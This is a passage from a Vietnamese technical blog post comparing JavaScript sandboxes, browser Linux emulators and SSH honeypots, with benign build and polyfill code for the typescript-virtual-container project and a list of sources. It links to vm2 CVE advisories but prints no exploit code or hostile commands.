Sự cô lập ở đây được đảm bảo bởi lớp VFS (shell của thread worker chỉ có thể thấy hệ thống file ảo, không bao giờ thấy hệ thống file chủ) cộng với cô lập bộ nhớ của thread Worker Node.js. Nó nhẹ hơn `isolated-vm` nhưng phù hợp hơn cho cô lập ở cấp shell thay vì cấp JS.

### Giới hạn tài nguyên

Bạn có thể cấu hình giới hạn tài nguyên cho mỗi shell ảnh hưởng đến những gì các lệnh giám sát hệ thống báo cáo:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Bên trong shell này, `free -m` hiển thị 512 MB RAM tổng. `nproc` trả về 2. `/proc/meminfo` hiển thị các giá trị bị giới hạn. `htop` và `top` hiển thị số CPU bị giới hạn. Điều này cho phép bạn xác định chính xác dấu chân phần cứng của máy được mô phỏng.

### Ba chế độ triển khai

```
Chế độ 1: Máy chủ SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Giao thức SSH thực, SFTP thực, SCP thực
  → Trường hợp sử dụng: honeypot, môi trường kiểm thử từ xa, phòng thí nghiệm đào tạo

Chế độ 2: Shell web (trình duyệt)
  builds/fortune-nyx-v1.7.6-web.min.js (bundle ESM)
  → Chạy trong trình duyệt, VFS được lưu trữ trong IndexedDB
  → Trường hợp sử dụng: hướng dẫn tương tác, terminal nhúng, demo
  → Phần thưởng: chạy startxfce4 cho một màn hình XFCE hoàn chỉnh được mô phỏng

Chế độ 3: CLI độc lập
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (một file duy nhất, không cần cài đặt)
  → curl và chạy, lưu trữ VFS trong thư mục .vfs/
  → Trường hợp sử dụng: demo nhanh, thử nghiệm cục bộ
```

### Các polyfill -- cách build trình duyệt hoạt động mà không cần Wasm

OK đây là phần tôi thực sự thông minh và tôi muốn nhấn mạnh đặc biệt.

Làm cho một thư viện Node.js hoạt động trong trình duyệt thường là một cơn ác mộng. Hoặc bạn sử dụng runtime Wasm (nặng, chậm tải), hoặc bạn dành hàng tuần để thay thế thủ công mỗi import `node:*` bằng một thay thế tương thích trình duyệt. Fortune đã làm điều thứ hai -- nhưng rất sạch sẽ, bằng cách viết một bộ polyfill tùy chỉnh sống trong thư mục `polyfills/` của kho lưu trữ.

Đường ống build chỉ là esbuild với một loạt các mục `alias`:

```js
// demo/build.js -- toàn bộ cấu hình build trình duyệt
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Không Wasm. Không thư viện polyfill bên ngoài. Không có mẹo `webpack-node-externals`. Chỉ là các module được alias và một số biến toàn cục được inject. Hãy để tôi phân tích từng cái vì một số thực sự ấn tượng.

**`node:fs` -- IndexedDB như một hệ thống file giả**

Cái này là yêu thích của tôi. Polyfill `node:fs` triển khai API Node.js fs đồng bộ (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) được hỗ trợ bởi hai lớp: một `Map` trong bộ nhớ cho các đọc đồng bộ, và IndexedDB cho sự bền vững giữa các lần tải lại trang. Ghi vào Map ngay lập tức (vì vậy `readFileSync` ngay sau `writeFileSync` luôn hoạt động), sau đó được xả vào IndexedDB một cách bất đồng bộ trong nền.

```js
// Bộ nhớ đệm đồng bộ (đường dẫn → Uint8Array | null) -- đọc tức thì
const memCache = new Map();

// Tải trước mọi thứ từ IndexedDB vào memCache khi khởi động
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Đây là lý do ảnh chụp VFS tồn tại qua các lần tải lại trang trong trình duyệt -- toàn bộ nhị phân `.vfsb` được ghi vào IndexedDB qua polyfill này, và đọc lại ở lần tải tiếp theo. Không Wasm. Không máy chủ. Chỉ IndexedDB, đã có trong mọi trình duyệt từ khoảng năm 2011.

**`node:crypto` -- SHA-256 trong JS thuần túy**

Thay vì import một thư viện crypto Wasm, polyfill crypto triển khai SHA-256 từ đầu sử dụng các hằng số vòng FIPS 180-4. 166 dòng JS thuần túy với hỗ trợ đầy đủ đầu ra hex/base64/Uint8Array. Tất cả hàm băm trong thư viện đều đi qua đây -- dấu vân tay khóa chủ SSH, checksum nội bộ, mọi thứ. Nhỏ gọn, không phụ thuộc, nó hoạt động.

**`node:os` -- đọc phần cứng thực sự của trình duyệt**

Cái này là một sự tinh tế đẹp. Thay vì trả về các giá trị giả cứng nhắc, `node:os` đọc `navigator.deviceMemory` cho RAM tổng và `navigator.hardwareConcurrency` cho số CPU. Vì vậy `neofetch` trong build trình duyệt thực sự báo cáo một cái gì đó khớp với máy thực của bạn -- không phải một stub giả `2 lõi, 2 GB RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB mặc định
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // cũng phân tích navigator.userAgent để đoán chuỗi mô hình CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- các stub trung thực**

Trình duyệt không thể mở socket TCP hoặc chạy SSH thực sự, vì vậy đây là các stub ném lỗi `NotImplemented` với một thông báo rõ ràng nếu có thứ gì đó cố gắng sử dụng chúng. Không thất bại im lặng, không có `undefined` trả về ở nơi một đối tượng được mong đợi. Chỉ một thông báo lớn, rõ ràng "cái này không hoạt động trong trình duyệt" -- chính xác những gì bạn muốn.

**`process.js` và `buffer.js` -- các biến toàn cục được inject**

Hai cái này được inject vào đầu mỗi file trong bundle qua tùy chọn `inject` của esbuild, vì vậy `process` và `Buffer` có sẵn trên toàn cục mà không cần import rõ ràng. `process.js` rất nhỏ: `env`, `version`, `platform: 'browser'`, `nextTick` qua `queueMicrotask`, `uptime` qua `performance.now()`. `buffer.js` là một triển khai lại đầy đủ của `Buffer` trên `Uint8Array` -- tất cả các phương thức `readUInt32BE`, `writeInt16LE`, các mã hóa hex/base64 mà triển khai SSH và VFS phụ thuộc vào.

---

Toàn bộ polyfill có khoảng 640 dòng JS viết tay tổng cộng. Không có package npm. Không Wasm. Và kết quả là một bundle trình duyệt chỉ là thư viện, chạy nguyên bản, không có bất kỳ lo lắng thông thường "nhưng liệu nó có thực sự hoạt động trong trình duyệt không?" mà bạn có với các thư viện được thiết kế cho Node trước tiên. Đáng để xem qua thư mục `polyfills/` trong kho lưu trữ nếu bạn tò mò -- mỗi file đều được chứa gọn và có thể đọc độc lập, đó là một lựa chọn phong cách mà tôi đánh giá rất cao.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Danh mục** | Sandbox JS | Sandbox JS | Sandbox JS | Trình giả lập | Trình giả lập | Node.js/Wasm | Honeypot | Trình mô phỏng |
| **Cô lập JS** | ⚠️ phạm vi | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | một phần | n/a | ✅ Worker |
| **Nhân Linux thực** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Trình thông dịch shell** | ❌ | ❌ | ❌ | ✅ (thực) | ✅ (thực) | ✅ (thực) | một phần | ✅ (tùy chỉnh) |
| **~170 lệnh Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | một phần | ~20 | ✅ |
| **Quyền POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | một phần | ✅ được áp dụng |
| **Quản lý người dùng** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | tối thiểu | ✅ hoàn chỉnh |
| **Máy chủ SSH thực** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/kiểm toán** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/ảnh chụp VFS** | ❌ | ❌ | ❌ | hạn chế | ❌ | ❌ | ❌ | ✅ |
| **Mạng ảo L2/L3** | ❌ | ❌ | ❌ | cơ bản | ❌ | ❌ | ❌ | ✅ hoàn chỉnh |
| **VPN ảo** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Hỗ trợ trình duyệt** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js gốc** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API được kiểu hóa** | cơ bản | ✅ | ✅ | tối thiểu | ❌ | ✅ | ❌ | ✅ hoàn chỉnh |
| **Tương thích nhị phân** | n/a | n/a | n/a | ✅ | ✅ | một phần | n/a | ❌ |
| **Thời gian khởi động** | tức thì | tức thì | tức thì | 15-40s | 15-40s | 2-5s | tức thì | <1s |
| **RAM/instance** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Phụ thuộc runtime** | 0 | 1 (native) | 1 (Wasm) | 0 | độc quyền | 1 | phụ thuộc Python | 3 (ssh2, ws, fflate) |
| **Trạng thái** | ổn định | ✅ hoạt động | ✅ hoạt động | ✅ rất tích cực | thương mại | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động |

---

## Khi nào dùng cái gì

**Bạn cần chạy JavaScript không đáng tin cậy -- một công thức do người dùng gửi, plugin, hook script.**  
→ `isolated-vm`. V8 Isolate thực sự, giới hạn bộ nhớ chặt chẽ, cầu nối giao tiếp rõ ràng. Tránh `vm2` -- danh sách CVE chỉ ngày càng dài, nghiêm túc đấy, nó như một cái mới vài tháng một lần. Tránh `vm` -- nó hoàn toàn không phải sandbox, làm ơn.

**Bạn cần cô lập JS và không muốn extension gốc, hoặc bạn cần tương thích trình duyệt.**  
→ `quickjs-emscripten`. Ranh giới Wasm, module khoảng 500 KB, hoạt động trong trình duyệt và Node. Chậm hơn V8 nhưng thực sự bị cô lập.

**Bạn cần khởi động một hệ điều hành Linux thực sự chưa sửa đổi với tương thích nhị phân.**  
→ `v86` cho Linux 32-bit, hoặc `container2wasm` nếu bạn có ảnh Docker có sẵn. Chấp nhận 150 MB+ RAM và 30 giây khởi động, đó là thỏa thuận. Nếu bạn cần 64-bit, hãy xem CheerpX hoặc chỉ sử dụng một runtime container thực sự.

**Bạn cần nhúng một terminal kiểu Linux vào ứng dụng web mà không cần backend.**  
→ `v86` (OS đầy đủ, nặng, chậm khởi động) hoặc bundle trình duyệt của `typescript-virtual-container` (trình mô phỏng, nhẹ hơn, khởi động tức thì, bao gồm `startxfce4` cho một màn hình hoàn chỉnh khá tuyệt).

**Bạn cần hướng dẫn lập trình tương tác trực tuyến hoặc IDE trong trình duyệt.**  
→ WebContainers nếu bạn tập trung vào hệ sinh thái Node.js. CheerpX nếu bạn cần một userspace Linux thực sự. Bundle trình duyệt của `typescript-virtual-container` nếu bạn muốn một tùy chọn nhẹ hơn với API được kiểu hóa.

**Bạn muốn thu thập TTP của kẻ tấn công SSH ở quy mô lớn.**  
→ Cowrie là tiêu chuẩn production, hết. Chạy trên bất kỳ máy chủ Linux nào, tích hợp với tất cả SIEM, giờ có chế độ LLM. Chỉ cần dùng Cowrie.

**Bạn muốn dữ liệu honeypot SSH trong một ứng dụng Node.js với API có thể lập trình.**  
→ `typescript-virtual-container`. Các lệnh thực sự thực thi. VFS là một cấu trúc dữ liệu thực sự mà bạn có thể chụp nhanh và so sánh khác biệt. Kẻ tấn công có được một môi trường tương tác thuyết phục, và bạn có được dữ liệu kiểm toán có cấu trúc mà không cần rời khỏi Node.

**Bạn cần tự động hóa shell / kiểm thử trong CI mà không cần Docker.**  
→ `typescript-virtual-container`. Khởi động trong chưa đầy một giây, chụp nhanh trước một bài kiểm tra, khôi phục sau. Chạy lệnh shell với API được kiểu hóa. Không cần daemon Docker, không cần nhân, không cần VM, không phải chờ đợi.

**Bạn cần môi trường shell đa người thuê (SaaS, giáo dục, đào tạo).**  
→ `typescript-virtual-container`. 5-20 MB mỗi instance so với 150-256 MB cho một trình giả lập. 100 người dùng đồng thời: ~2 GB so với ~25 GB. Đó là một khác biệt lớn về chi phí lưu trữ!

**Bạn cần một honeypot thực tế mà còn cho phép bạn xây dựng một phòng thí nghiệm mạng đa VM.**  
→ `typescript-virtual-container` là thứ duy nhất trong không gian này làm được cả hai.

---

## Những gì nó không thể làm (và tôi muốn thành thật về điều này)

Nó không thể chạy nhị phân x86 gốc. Nếu bạn cần biên dịch mã C, chạy một trình thông dịch Python thực sự, hoặc sử dụng phần mềm được biên dịch cho Linux, không có ABI nhân nào để hỗ trợ các lời gọi hệ thống đó. Các lệnh như `gcc`, `python3`, và `node` là các stub -- chúng trả lời `--version` và các lời gọi phổ biến, nhưng không thực thi bất cứ thứ gì thực sự.

Đó là sự đánh đổi cơ bản: bạn tiết kiệm được 10 đến 50 lần bộ nhớ, khởi động tức thì, tương thích trình duyệt, API được kiểu hóa, SSH thực sự, và mạng ảo -- và bạn từ bỏ tương thích nhị phân với userspace Linux.

Fortune đã suy nghĩ rất nhiều về điều này khi thiết kế dự án. Đối với các trường hợp sử dụng cô ấy nhắm đến -- honeypot, kiểm thử, terminal nhúng, môi trường CI -- chạy một nhị phân biên dịch thực sự không bao giờ cần thiết. Pipeline shell, thao tác file, định tuyến mạng và SSH bao phủ mọi thứ. Nhưng nếu trường hợp sử dụng của bạn yêu cầu phần mềm biên dịch thực sự, `v86` hoặc Docker là câu trả lời đúng, không phải cái này.

---

## Kết luận

Vậy là xong. Hệ sinh thái này rộng hơn và phân mảnh hơn so với vẻ ngoài của nó. `vm` là một bộ phân tách phạm vi, không phải sandbox. `vm2` tiếp tục tích lũy CVE (thực sự đấy, hãy nhìn các cảnh báo của tháng này). `isolated-vm` là câu trả lời đúng cho cô lập JS nhưng chỉ JS. `quickjs-emscripten` là lựa chọn đúng khi bạn cần tương thích trình duyệt hoặc muốn tránh extension gốc. `v86` và CheerpX là các trình giả lập thực sự khi bạn cần tương thích nhị phân thực sự. WebContainers là Node.js trong Wasm, không phải môi trường Linux đa năng. Cowrie là tiêu chuẩn vàng của honeypot SSH, nhưng nó là Python và không gốc Node.

Và sau đó có `typescript-virtual-container` -- dự án của Fortune -- sống trong một thể loại riêng của nó. Không phải trình giả lập, không phải sandbox JS, không phải honeypot thụ động. Một thứ gì đó ở giữa tất cả mà hóa ra lại hữu ích đáng ngạc nhiên cho nhiều thứ mà không cái nào khác có thể làm được.

`typescript-virtual-container` lấp đầy khoảng trống mà không cái nào khác chạm tới: một môi trường shell Linux hoàn chỉnh, có thể lập trình với SSH thực sự, SFTP, quyền POSIX, quản lý người dùng, mạng ảo, và API TypeScript được kiểu hóa -- chạy trong khoảng 10 MB, khởi động trong chưa đầy một giây, hoạt động cả trong Node.js và trình duyệt.

Nếu bạn muốn thử: mã nguồn có trên [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) và có một bản demo trực tuyến (bao gồm `startxfce4` cho một màn hình hoàn chỉnh, thực sự rất đỉnh) tại [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Hãy xem và để lại vài ngôi sao cho Fortune trên GitHub, cô ấy xứng đáng!

Cảm ơn bạn đã đọc -- bài này dài ngay cả với tiêu chuẩn của tôi :) hy vọng nó hữu ích cho bạn!

---

## Nguồn

Tôi đã cố gắng liên kết mọi tuyên bố với một nguồn chính -- cảnh báo CVE, tài liệu chính thức, kho GitHub, bài blog của người bảo trì. Vài ghi chú: danh sách CVE của vm2 tiếp tục dài ra, vì vậy liên kết FortiGuard có thể đã lỗi thời khi bạn đọc (hãy xem trang cảnh báo GitHub để biết các CVE mới nhất). Các liên kết Bellard đều ổn định -- trang web cá nhân của ông ấy đã tồn tại mãi mãi và nội dung không thay đổi. Và nếu bạn muốn tìm hiểu sâu hơn về bất kỳ polyfill nào, chỉ cần duyệt thư mục `polyfills/` trong kho `typescript-virtual-container` trực tiếp -- nó dễ đọc hơn bất kỳ mô tả nào tôi có thể viết ở đây.

### Sandbox JavaScript

- **Module `vm` của Node.js** -- tài liệu chính thức: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Cảnh báo bảo mật `vm` của Node.js** -- "Module vm không phải là cơ chế bảo mật. Đừng dùng nó để chạy mã không đáng tin cậy": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Dòng thời gian CVE vm2** -- Cảnh báo FortiGuard với danh sách đầy đủ CVE và ngày tháng: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Thoát qua lỗi async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Mục Exploit DB với PoC đầy đủ: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 lỗ hổng thoát mới, phân tích: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Bài phân tích của oxeye.io về CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Nội bộ V8 Isolate** -- Hướng dẫn nhúng: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Engine QuickJS** -- bởi Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Mô hình quyền Deno** -- tài liệu: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Phát hành Deno 2** -- Tháng 10 năm 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Đề xuất TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Đề xuất TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Bài viết thực hành của Andrew Healey về cách tiếp cận sandbox của Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Trình giả lập Linux

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Ma trận hỗ trợ OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS được sử dụng bởi v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Mở rộng Bochs VBE** (tham khảo VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Trình giả lập của Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Ghi chú kỹ thuật (TinyEMU, lịch sử, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Mã nguồn C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · GitHub mirrors không chính thức: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Trình giả lập JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- tài liệu: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Hướng dẫn pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Tài liệu API: [webcontainers.io](https://webcontainers.io) · Thông báo: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Tổng quan InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Bài blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Bài của Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Tài liệu: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (đã lưu trữ): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js tối thiểu: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Danh sách được tuyển chọn: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Phát hiện thông tin hệ thống (cách kẻ tấn công nhận dạng honeypot): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo trực tuyến**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Hướng dẫn kiến trúc**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (triển khai giao thức SSH) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (nén ảnh chụp VFS) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (vận chuyển shell WebSocket) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Đọc thêm

- **Mô hình quyền POSIX** -- Đặc tả Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (mẫu được sử dụng trong bền vững VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Mô hình V8 Isolate** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Đặc tả ISA RISC-V** (cho bối cảnh TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Kiến trúc OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, tương phản hữu ích với cách tiếp cận Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL về kích thước bundle quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
